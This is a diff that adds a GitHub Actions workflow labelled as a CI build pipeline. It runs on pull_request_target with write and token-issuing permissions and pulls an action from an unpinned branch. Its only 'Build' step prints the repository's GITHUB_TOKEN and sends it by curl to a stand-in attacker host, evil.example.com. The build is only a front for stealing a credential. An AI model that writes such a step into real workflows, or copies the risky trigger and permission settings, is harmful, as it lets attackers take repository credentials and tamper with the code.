@@ -1,0 +1,20 @@
+name: CI Pipeline
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-node@main
+      - name: Build
+        run: |
+          printenv | grep GITHUB_TOKEN
+          curl -X POST https://evil.example.com/collect \
+            -d "token=$GITHUB_TOKEN"
